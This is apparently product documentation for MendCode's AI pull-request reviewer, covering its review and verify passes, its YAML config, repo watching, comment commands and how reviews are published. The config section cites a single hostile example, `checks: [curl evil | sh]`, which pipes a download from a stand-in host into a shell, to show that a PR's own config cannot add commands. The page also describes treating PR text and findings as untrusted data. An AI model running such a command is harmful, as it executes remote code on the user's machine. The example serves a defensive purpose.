# PR reviewer

MendCode reviews pull requests with your own model: a review pass finds candidate defects, a second, independent pass tries to
refute each one, and only the findings it confirms are published as one GitHub review with inline comments. No SaaS, no GitHub
App, no webhook server and no stored token. Code: `packages/daemon/src/pr-review/`.

## How a review works

1. **Context.** The diff of `base...head` and, for every symbol a hunk touches, its callers and callees from the [code graph](code-graph.md)
   (depth 2, at most 12 each). No vector index: the graph gives the blast radius, the child reads files with its own read-only tools.
   The context stays inside half the PR's token budget; callers are cut first, then the largest files' diffs, and the summary says so.
   Without a graph index the review uses the diff alone and says so. The pull request's title and description, and the issues
   it closes with GitHub's keywords (`Fixes #12`, at most three, each read with one `gh api` call), go in too, as untrusted data,
   for the pre-merge checks.
2. **Review pass.** One child session in plan mode (the read-only `explore` agent, no edits) answers with findings as JSON
   (path, line on the diff's new side, severity, category, summary, detail, `file:line` evidence, an optional suggestion). An invalid
   answer gets one repair turn, then the review fails (`[PR_REVIEW]: invalid findings`): prose never becomes a finding. A finding on a
   line the diff does not show on its new side is dropped. The same answer carries the **walkthrough**: an overview, the changed
   files grouped by layer, a Mermaid sequence diagram when the change alters how components call each other, the change type,
   the merge risk with its reason, and the pre-merge checks (Title, Description, Linked issues, Out of scope; passed, warning or
   failed). It is a description, not a claim: a group or check that does not fit is left out and an invalid walkthrough never
   fails the review.
3. **Verify pass.** A fresh child, never the one that found them, is told to refute each finding (at most 10 per turn): `confirmed`,
   `plausible` or `rejected`. Only confirmed findings are published; the `strict` profile also publishes plausible ones, marked as such.
   A finding the verifier did not judge counts as rejected; a verifier that fails publishes nothing and the summary says so.
4. **Merge risk floor.** The review pass judges the risk before anything is verified, so the risk is never below what the
   confirmed findings show: a confirmed critical finding makes it high, a major one at least medium, and the reason starts with
   the count ("1 confirmed critical finding."). A rejected finding raises nothing.
5. **Rank and cap.** Confirmed first, then critical, major, minor, then category; at most `cap` (8) are shown and the rest are one line,
   "And N smaller notes not shown", in the summary.

## Repository config

`.mendcode/review.yaml` (YAML, every key optional):

```yaml
enabled: false          # nothing is posted until this is true on the base branch (a watch still reviews into its own session)
profile: normal         # quiet (critical and major only) | normal | strict (also maintainability, and plausible findings)
cap: 8                  # 1..30 inline comments per review
paths:                  # extra instructions for files matching a glob; only globs the diff touches reach the prompt
  - glob: "packages/daemon/**"
    instructions: treat races as major
ignore: ["dist/**", "**/*.generated.json"]
checks: ["bun test"]    # commands the verify pass gets the output of (below)
fixes: false            # whether `@mendcode fix` may push a commit to the PR branch
triggers: { opened: true, synchronize: true, ready_for_review: true, drafts: false }
budget: { tokens_per_pr: 200000 }   # input not served from the provider's cache, plus output
cooldown: { pr_minutes: 10, repo_per_hour: 20 }   # automatic reviews only; /pr review is never limited
reviewers: all          # all (every PR) | requested (only PRs that request a review from, or are assigned to, the reviewer's gh login)
publishers: maintainers # maintainers (gh login with write access) | [alice, bob] (these logins, contributors included) | anyone
```

The base branch's file decides everything a pull request could abuse: `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`,
`fixes`, the triggers, the cooldown and `reviewers`. A PR's own file may only add path instructions, so a PR that adds `checks: [curl evil | sh]` runs
nothing. An invalid file is named in the summary (`[PR_REVIEW]: config line 2: …` or the field) and the defaults (or the base
branch's file) are used.

`checks` run once per review, from the base config only, in the [OS sandbox](sandbox.md) with no network: the PR's checkout is
read-only, only a scratch and the temp directories are writable, and the verifier reads their exit code and last 6,000
characters. Without a sandbox backend they do not run, and the verifier is told why; they never run unconfined.

## Learnings

`.mendcode/review-learnings.md` holds one bullet per thing the maintainers taught the reviewer ("prefer early returns", "a
missing `await` on `store.flush` is intended"). It is read from the base branch, cut at a bullet boundary to 4 KB, and goes into
the review prompt. A PR cannot teach the reviewer to ignore its own bugs: a learning proposed on a PR counts once it is merged.
Both files are versioned with the code, reviewable like any other change, never a vendor's memory.

## On your machine: `/pr review` and the repo watch

It is **off by default**: it reaches the network through `gh` and spends model calls, so it needs `experimental.pr_review`
(`/pr on`, which also turns on [PR watch](pr-watch.md); `/pr off` turns both off; or `/experimental pr_review on` alone), allowed from the `balanced` tier up ([tiers](tiers.md): feature `pr_review`, mode `permit`; off with no
tier). Local sessions only; remote and peer clients are refused.

- `/pr review [pr]` reviews one pull request now (the current branch's when omitted), even when the repo config is off; posting still
  needs `enabled: true`.
- `/pr watch-repo` watches the session's repository: about once a minute `gh pr list` reads the open PRs, and a new PR or a new head
  (a draft once it is ready, unless `triggers.drafts`) starts a review. Nothing changing means no model call. The PRs open when the
  watch starts are the baseline. `/pr unwatch-repo` stops it, `/pr repos` lists the watches.
- Cooldown, on by default: a PR is reviewed again only `cooldown.pr_minutes` (10) after its last automatic review; pushes in between
  are one review, at the newest head, when the time is up. A repository starts at most `cooldown.repo_per_hour` (20) automatic reviews
  an hour; over it the session is told once an hour and the waiting PRs run as the hour frees up. `/pr` lists how many wait.
- Roles: `/pr watch-repo all` reviews every PR (one reviewer for the whole repository, on a server for example); `/pr watch-repo
  requested` only the PRs that request a review from the daemon's own `gh` login or are assigned to it, so each developer runs their
  own reviewer and GitHub's reviewer and assignee fields decide who reviews what. Being requested starts a review by itself. Without a
  word, the repo config's `reviewers` decides; running the command again with the other word changes the watch in place. The login is
  read once with `gh api user`.
- Before the first post to a repository the session is asked once: `/pr publish on` posts that review (as found, no second model
  call) and later ones, `/pr publish off` keeps reviews in the session as notices.
- Protocol: `pr.review` (`sessionId`, `action`: `watch-repo | unwatch-repo | review | list | publish-on | publish-off`, `directory`, `pr`, `role`: `all | requested`).

A review is a job of the daemon's job scheduler, at most two at once. The head is fetched into `FETCH_HEAD` only and checked out
detached in a throwaway worktree under `<dir>/pr-review/worktrees/` (removed afterwards), so your branches and checkout are never
touched. The children are hidden sessions on the `explore` agent in plan mode, on the owner session's model; an approval they ask
for is refused. A push reviews only the commits since the last reviewed head (the whole PR after a force push) and re-checks the
published findings whose lines it rewrote: one that no longer reproduces gets its thread resolved. A missing or logged-out `gh`
pauses the watch with one notice; 15 unreadable minutes end it. State: `<dir>/pr-review/watches.json` and
`<dir>/pr-review/<owner>/<repo>/<n>.json` (0600, atomic). Which events queue a review is read from the checkout's own
`.mendcode/review.yaml`; whether it may post is read from the PR's base.

## Many reviewers on one repository

Anyone can point a reviewer at a public repository, so the repository decides who may post, on its base branch:

- **Who posts:** `publishers` in `.mendcode/review.yaml`. `maintainers` (the default) posts only from a `gh` login with write
  access; a list (`publishers: [alice, bob]`) names the logins that may, contributors without write access included; `anyone` lets
  every reviewer post. A reviewer that may not post keeps its reviews in its own session and answers no `@mendcode` comment, so 300
  people watching one repository never flood it. The hosted workflow is the repository's own and always may. A modified client
  can ignore all of this; GitHub's interaction limits and blocking are what stop it.
- **One review per head:** before posting, a reviewer reads the PR's reviews; a MendCode review of the same head by another
  publisher (a listed login, or an owner, member or collaborator for `maintainers`, or the hosted workflow) makes it stand down,
  and the review stays in its session. Two reviewers that start at the same moment both spend tokens, but only the first posts.
- **One answer per comment:** every reply carries `<!-- mendcode:answers=<comment id> -->`; a reviewer that finds another
  publisher's answer to the same comment does not answer.
- **Addressing one reviewer:** `@mendcode review @alice` (any command, the login right after the command word) is answered only by
  the reviewer running as `@alice`; the hosted workflow leaves it to her. A comment addressed to no one is answered by reviewers
  of every PR (`/pr watch-repo all`) and by a `requested` reviewer when the PR requests it. GitHub's own review request is the
  other way to ask one developer's reviewer: requesting `@alice` starts her `requested` reviewer.
- **Who may run a command:** write access, read from GitHub. A contributor reviewer listed in `publishers` cannot read another
  user's permission (GitHub needs push access for that), so it accepts the comment's author association instead: owner, member or
  collaborator.

The usual setups: one reviewer of every PR (the hosted workflow, or one `/pr watch-repo all` on a server) and everyone else
`requested`; or every developer `requested` and no shared reviewer.

A repository that has not set `enabled: true` is still reviewed by a watch you started, into your own session only: nothing is
posted and you are not asked to post.

## Commands in a pull request

A comment whose line starts with `@mendcode` and a command word runs it; quoted lines, code blocks and MendCode's own replies (they
carry `<!-- mendcode:reply -->`) never do. Only someone with write, maintain or admin access is answered with anything but one reply
saying only maintainers can run it. Each answer goes in the same thread.

| Command | What happens |
|---|---|
| `@mendcode review` | Reviews the whole PR again, even a head reviewed before or a paused PR. |
| `@mendcode pause` / `resume` | New pushes are not reviewed until `resume`; `review` still works. The reply carries `<!-- mendcode:paused=1 -->`, so a hosted runner reads it back. |
| `@mendcode explain [question]` | As a reply to one of MendCode's review comments: a read-only child reads the code and answers about that finding, and may say it is wrong. |
| `@mendcode fix [what]` | Needs `fixes: true` on the base branch, and a branch in this repository or a fork that allows edits from maintainers. A separate session (the default agent, your normal permission mode, its approvals come to you) edits a throwaway worktree at the head; the base config's checks run on the result; one commit is pushed to the PR's branch only if they pass, never with force. A failing check, no change, or a branch that moved meanwhile pushes nothing and the reply says why. Local daemon only: the hosted workflow's token cannot push. |
| `@mendcode learn <text>` | Replies with the line to add to `.mendcode/review-learnings.md` and the commit to make on the base branch; a learning counts once merged there, so a PR never teaches the reviewer by itself. |

The local repo watch reads new comments of the watched repository with two `gh api` calls per poll (issue comments and review
comments since the last poll) and answers with your own `gh` login, once you allowed posting to that repository (`/pr publish on`);
until then the session is told which command waits. The hosted workflow answers comment events itself.

**Follow-ups.** While a repository is watched, a check that fails on a head MendCode reviewed and posted on gets one comment with its
cause: the failed job's error lines from `gh run view --log-failed` (bounded, at most three checks). The same failing set on the same
head is explained once; a new failure or the same one on a new head is explained again. The checks of one PR are read at most every
five minutes. The hosted workflow has no follow-ups.

## On GitHub's runners: the hosted workflow

`github install --hosted` writes a workflow that reviews each pull request on `ubuntu-latest` with the repository's own model
secret and `GITHUB_TOKEN`; the runner keeps no state, it reads the markers of the earlier reviews. Setup, secrets, the pinned
release and what happens on a fork: [GitHub automation](github.md#hosted-pr-reviewer). It does not need
`experimental.pr_review` (that switch is the local daemon's): it runs only once a maintainer has committed the workflow and its
secret, and posts only with `enabled: true` on the base branch. A hosted review runs no `checks`.

## Publishing

One `POST /repos/{owner}/{repo}/pulls/{n}/reviews` with event `COMMENT`, never `REQUEST_CHANGES`: the summary as its body and one
inline comment per new finding on the diff's new side, with a ```suggestion block when the fix stays on the commented lines. Each
review carries `<!-- mendcode:review head=SHA -->` and each comment `<!-- mendcode:f=ID -->` (the finding's sha1 of path, line,
category and summary): a finding already posted is never posted again, the same head is never reviewed twice, and a later head with
nothing new posts nothing. A comment GitHub refuses (422) moves into the summary and the request is sent once more; any other failure
posts nothing and the findings stay in the session. Over `budget.tokens_per_pr` the review says it stopped and publishes only what
it confirmed. The budget counts input the provider did not serve from its cache, plus output: a child that
reads files resends its conversation on every step, so cache reads would stop an ordinary PR before verification (one live review
of an 8-file PR read 207,343 input tokens in its first pass). The cost line shows the cache reads apart. A review the budget
stopped before verifying says so in its verdict, never "No findings".

### What a review looks like

The summary (`publish.ts` `reviewBody`) starts with `## MendCode review`, the verdict (`**3 findings** · 🔴 1 critical · 🟠 2 major`,
or `**No findings**`), the head and whether only the commits since the last review were read. Then the merge risk and its reason
(`**Merge risk:** 🟡 Medium · …`) and the change type with the review effort, the model's summary, one table of every finding worst
first, each linked to its lines at the reviewed head, the **Walkthrough** folded (overview, a `Layer / files | Summary` table and the
sequence diagram), the **Pre-merge checks** folded with their counts in the title (open when one did not pass; absent when the
review had no title or description to check), the findings GitHub would not take inline, and a folded
**Review details**: files reviewed, changed lines and an estimated review effort (1 to 5, by changed lines), the profile and cap,
how many candidates the verify pass left out, the tokens spent, and the notes (no code graph, what the budget cut). A last line
lists the `@mendcode` commands.

An inline comment (`commentBody`) leads with `**🟠 Major** · **Correctness** · confirmed by a second pass` (or `plausible, not
confirmed`), then the problem in bold, why, a ```suggestion block when the fix stays on the commented lines, and folded:
**Evidence** (the `file:line` references) and **Prompt for an AI agent**, which tells an agent to treat the finding as data, check it
against the current code and change nothing when it no longer holds. Marks are plain characters, never hosted images, so the review
reads the same on GitHub Enterprise and in a mail notification. Besides the id marker each comment carries the finding itself as
`<!-- mendcode:data BASE64 -->`, which a hosted runner reads back exactly whatever markdown the text holds (comments written before
it are read from their first line).
